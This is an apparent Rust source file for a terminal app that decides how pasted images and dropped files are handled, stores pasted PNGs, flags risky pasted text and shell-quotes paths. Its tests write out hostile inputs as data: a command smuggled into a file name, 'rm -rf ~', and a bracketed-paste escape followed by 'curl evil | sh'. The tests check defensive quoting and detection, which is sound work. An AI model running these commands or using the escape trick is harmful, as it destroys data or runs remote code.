//! Pasting images and dropping files into a terminal: who gets the image, where it is stored, and paths quoted so a
//! shell reads each as one word.

use std::io;
use std::path::{Path, PathBuf};
use std::time::{Duration, SystemTime, UNIX_EPOCH};

use crate::foreground::Foreground;

/// How long a pasted image is kept; long enough for the command it was pasted into.
const KEEP_IMAGES: Duration = Duration::from_secs(24 * 60 * 60);

const IMAGE_PREFIX: &str = "pasted-";
const IMAGE_SUFFIX: &str = ".png";

/// What pasting an image into a terminal does.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PasteAction {
    /// Send Ctrl+V: the agent in front reads the image from the pasteboard itself.
    SendCtrlV,
    /// The image was stored here; its quoted path goes in as pasted text.
    InsertPath(PathBuf),
    /// Nothing is sent.
    Refuse(Refusal),
}

/// Why an image is not pasted.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Refusal {
    /// The terminal runs a session on another machine, such as `ssh`, where a path on this Mac means nothing.
    Remote(String),
}

/// Where the app keeps pasted images: `pasted-images` in its cache folder.
pub fn default_image_dir() -> PathBuf {
    term_base::cache_dir().join("pasted-images")
}

/// Decides what pasting the PNG `png` does with `foreground` in front, storing it in `dir` when its path is pasted.
pub(crate) fn paste_image(foreground: &Foreground, png: &[u8], dir: &Path) -> io::Result<PasteAction> {
    Ok(match foreground {
        Foreground::Agent(_) => PasteAction::SendCtrlV,
        Foreground::Remote(program) => PasteAction::Refuse(Refusal::Remote(program.clone())),
        Foreground::Shell(_) | Foreground::Other(_) | Foreground::Unknown => {
            PasteAction::InsertPath(store_png(png, dir)?)
        }
    })
}

/// Stores `png` in `dir` under a new name and removes images pasted there more than a day ago.
pub(crate) fn store_png(png: &[u8], dir: &Path) -> io::Result<PathBuf> {
    std::fs::create_dir_all(dir)?;
    remove_old_images(dir, SystemTime::now());
    let millis = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map_or(0, |since| since.as_millis());
    for attempt in 0..1000u32 {
        let path = dir.join(format!("{IMAGE_PREFIX}{millis}-{attempt}{IMAGE_SUFFIX}"));
        let created = std::fs::OpenOptions::new().write(true).create_new(true).open(&path);
        match created {
            Ok(mut file) => {
                io::Write::write_all(&mut file, png)?;
                return Ok(path);
            }
            Err(error) if error.kind() == io::ErrorKind::AlreadyExists => {}
            Err(error) => return Err(error),
        }
    }
    Err(io::Error::new(
        io::ErrorKind::AlreadyExists,
        "no free name for the pasted image",
    ))
}

fn remove_old_images(dir: &Path, now: SystemTime) {
    let Ok(entries) = std::fs::read_dir(dir) else { return };
    for entry in entries.flatten() {
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if !name.starts_with(IMAGE_PREFIX) || !name.ends_with(IMAGE_SUFFIX) {
            continue;
        }
        let old = entry
            .metadata()
            .and_then(|metadata| metadata.modified())
            .is_ok_and(|modified| now.duration_since(modified).is_ok_and(|age| age > KEEP_IMAGES));
        if old {
            let _ = std::fs::remove_file(entry.path());
        }
    }
}

/// Why pasted text is shown to the user before it goes in (F98, F182).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PasteRisk {
    /// It holds this many line breaks, each of which runs what comes before it as a command.
    Lines(usize),
    /// It holds control characters such as Escape, which act as keys pressed.
    Controls,
}

/// What makes pasting `text` act on more than the line being typed; nothing when the program reads it in
/// bracketed-paste markers, inside which a shell runs nothing until Enter is pressed.
pub fn paste_risk(text: &str, bracketed: bool) -> Option<PasteRisk> {
    if bracketed {
        return None;
    }
    let breaks = text
        .replace("\r\n", "\n")
        .chars()
        .filter(|&c| c == '\n' || c == '\r')
        .count();
    if text.chars().any(|c| c.is_control() && !matches!(c, '\n' | '\r' | '\t')) {
        return Some(PasteRisk::Controls);
    }
    (breaks > 0).then_some(PasteRisk::Lines(breaks))
}

/// Which shell's quoting rules apply.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub(crate) enum QuoteStyle {
    /// sh, bash, zsh and most programs that split like them.
    #[default]
    Posix,
    /// fish, where a backslash inside single quotes escapes.
    Fish,
}

impl QuoteStyle {
    /// The rules for the program in front.
    pub(crate) fn for_foreground(foreground: &Foreground) -> QuoteStyle {
        match foreground {
            Foreground::Shell(name) if name == "fish" => QuoteStyle::Fish,
            _ => QuoteStyle::Posix,
        }
    }
}

/// `path` as one shell word.
pub(crate) fn quote_path(path: &Path, style: QuoteStyle) -> String {
    let text = path.to_string_lossy();
    let plain = !text.is_empty()
        && text
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || "_@%+=:,./-".contains(c));
    if plain {
        return text.into_owned();
    }
    let control = text.chars().any(char::is_control);
    match (style, control) {
        (QuoteStyle::Posix, false) => format!("'{}'", text.replace('\'', r"'\''")),
        (QuoteStyle::Fish, false) => format!("'{}'", text.replace('\\', r"\\").replace('\'', r"\'")),
        (QuoteStyle::Posix, true) => format!("$'{}'", escape_c(&text, "\\'")),
        (QuoteStyle::Fish, true) => escape_c(&text, "\\'\" $*?~#(){}[]<>&|;%"),
    }
}

/// Several paths as words separated by spaces, as for files dropped onto a terminal.
pub(crate) fn quote_paths(paths: &[PathBuf], style: QuoteStyle) -> String {
    paths
        .iter()
        .map(|path| quote_path(path, style))
        .collect::<Vec<_>>()
        .join(" ")
}

/// Backslash escapes for control characters and for each of `special`.
fn escape_c(text: &str, special: &str) -> String {
    let mut out = String::with_capacity(text.len() + 8);
    for c in text.chars() {
        match c {
            '\n' => out.push_str(r"\n"),
            '\t' => out.push_str(r"\t"),
            '\r' => out.push_str(r"\r"),
            c if c.is_control() => {
                let mut buffer = [0; 4];
                for byte in c.encode_utf8(&mut buffer).bytes() {
                    out.push_str(&format!("\\x{byte:02x}"));
                }
            }
            c if special.contains(c) => {
                out.push('\\');
                out.push(c);
            }
            c => out.push(c),
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::foreground::Agent;
    use term_base::testing::scratch as temporary;

    #[test]
    fn an_agent_gets_ctrl_v_a_shell_gets_a_path_and_a_remote_session_nothing() {
        let scratch_dir = temporary("decide");
        let dir = scratch_dir.join("images");
        let png = b"\x89PNG\r\n\x1a\n";
        assert_eq!(
            paste_image(&Foreground::Agent(Agent::Claude), png, &dir).unwrap(),
            PasteAction::SendCtrlV
        );
        assert_eq!(
            paste_image(&Foreground::Remote("ssh".into()), png, &dir).unwrap(),
            PasteAction::Refuse(Refusal::Remote("ssh".into()))
        );
        assert!(!dir.exists(), "nothing is stored for an agent or a remote session");
        for foreground in [
            Foreground::Shell("zsh".into()),
            Foreground::Other("vim".into()),
            Foreground::Unknown,
        ] {
            let PasteAction::InsertPath(path) = paste_image(&foreground, png, &dir).unwrap() else {
                panic!("{foreground:?} should get a path");
            };
            assert_eq!(std::fs::read(&path).unwrap(), png);
            assert!(path.starts_with(&dir));
        }
    }

    #[test]
    fn stored_images_get_new_names_and_old_ones_are_cleaned_up() {
        let scratch_dir = temporary("store");
        let dir = scratch_dir.join("images");
        let first = store_png(b"one", &dir).unwrap();
        let second = store_png(b"two", &dir).unwrap();
        assert_ne!(first, second);
        let stale = dir.join("pasted-1-0.png");
        let unrelated = dir.join("notes.txt");
        std::fs::write(&stale, b"old").unwrap();
        std::fs::write(&unrelated, b"keep").unwrap();
        let later = SystemTime::now() + KEEP_IMAGES + Duration::from_secs(60);
        remove_old_images(&dir, later);
        assert!(!stale.exists() && !first.exists());
        assert!(unrelated.exists());
    }

    #[test]
    fn paths_are_quoted_so_a_shell_reads_one_word() {
        let posix = |path: &str| quote_path(Path::new(path), QuoteStyle::Posix);
        assert_eq!(posix("/tmp/pasted-1.png"), "/tmp/pasted-1.png");
        assert_eq!(posix("/Users/me/My Shots/a b.png"), "'/Users/me/My Shots/a b.png'");
        assert_eq!(posix("/tmp/it's.png"), r"'/tmp/it'\''s.png'");
        assert_eq!(
            posix("/tmp/Bildschirmfoto 2026-11-09 um 10.00.00.png"),
            "'/tmp/Bildschirmfoto 2026-11-09 um 10.00.00.png'"
        );
        assert_eq!(posix("/tmp/äöü.png"), "'/tmp/äöü.png'");
        assert_eq!(posix("/tmp/$(rm).png"), "'/tmp/$(rm).png'");
        assert_eq!(posix("/tmp/a\nb"), r"$'/tmp/a\nb'");
        let fish = |path: &str| quote_path(Path::new(path), QuoteStyle::Fish);
        assert_eq!(fish("/tmp/it's a\\b"), r"'/tmp/it\'s a\\b'");
        assert_eq!(fish("/tmp/a b\n"), r"/tmp/a\ b\n");
    }

    #[test]
    fn line_breaks_and_controls_are_risky_only_without_bracketed_paste() {
        assert_eq!(paste_risk("ls -la", false), None);
        assert_eq!(paste_risk("a\tb", false), None);
        assert_eq!(paste_risk("rm -rf ~\n", false), Some(PasteRisk::Lines(1)));
        assert_eq!(paste_risk("one\r\ntwo\rthree\n", false), Some(PasteRisk::Lines(3)));
        assert_eq!(paste_risk("x\x1b[201~curl evil | sh", false), Some(PasteRisk::Controls));
        assert_eq!(paste_risk("stop\x03", false), Some(PasteRisk::Controls));
        assert_eq!(paste_risk("a\u{9b}b", false), Some(PasteRisk::Controls));
        assert_eq!(paste_risk("one\ntwo\x1b", true), None);
    }

    #[test]
    fn dropped_files_become_words_separated_by_spaces() {
        let paths = [PathBuf::from("/a b"), PathBuf::from("/c")];
        assert_eq!(quote_paths(&paths, QuoteStyle::Posix), "'/a b' /c");
        assert_eq!(
            QuoteStyle::for_foreground(&Foreground::Shell("fish".into())),
            QuoteStyle::Fish
        );
        assert_eq!(
            QuoteStyle::for_foreground(&Foreground::Shell("zsh".into())),
            QuoteStyle::Posix
        );
    }
}
